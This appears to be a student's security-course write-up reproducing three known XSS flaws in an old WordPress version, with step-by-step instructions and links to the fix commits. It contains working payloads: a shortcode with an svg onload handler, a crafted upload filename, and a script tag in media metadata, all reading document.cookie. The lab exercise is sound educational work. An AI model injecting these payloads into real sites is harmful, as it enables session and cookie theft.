# Week 7 assignment
Time spent: 5 hours

## Wordpress Exploits

1\. [x] (Required) Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
- [x] Summary:
- Vulnerability type: XSS and embed
- Tested in version: 4.2
- Fixed in version: 4.2.13

- [x] GIF Walkthrough:<img src='https://i.imgur.com/MW3HHQt.gif' title='GIF Walkthrough' width='' alt='GIF Walkthrough' />
- [x] Steps to recreate:
- Find any youtube video and get the embedded Link
- Put the link inside this code: [embed src = 'https://www.youtube.com/embed/cKf5ENdTzQ8\x3csvg onload=alert(document.cookie)\x3e'][/embed]
- The error message will be displayed on top
- [x] Affected source code:
- [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)


2\. [x] (Required) Title: Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
- [x] Summary:
- Vulnerability type: XSS and upload
- Tested in version: 4.2
- Fixed in version: 4.2.15
- [x] GIF Walkthrough:<img src='https://i.imgur.com/K0RhN3Q.gif' title='GIF Walkthrough' width='' alt='GIF Walkthrough' />
- [x] Steps to recreate:
- It's required for admin to upload the files
- Create a file of 20mb size. This can be done in Linux using this command: dd if=/dev/zero of=upload_test bs=20000000 count=1
- Name the file: File too big<img src=x onerror=alert(document.cookie)>.png
- upload the file under wp-admin/media-new.php
- The error message will be displayed
- [x] Affected source code:
- [Link 2](https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6)

3\. [x] (Required) Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
- [x] Summary:
- Vulnerability type: XSS
- Tested in version: 4.2
- Fixed in version 4.2.13
- [x] GIF Walkthrough: <img src='https://i.imgur.com/LxkD1g3.gif' title='GIF Walkthrough' width='' alt='GIF Walkthrough' />
- Steps to recreate:
- It's required for the admin to upload files
- Add a few media files and insert "Media File <noscript/><script>alert(document.cookie);</script>" into their file description box
- Create a new post and add the files as a media playlist and the error message will be shown
- [x] Affected source code:
- [Link 3](https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7)

## Notes
It was difficult to reproduce the SQL injection and CSRF exploits.
Overall I had a fun with this assignment despite some difficulties.

## License

Copyright [2017] [Gurmehar Cheema]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
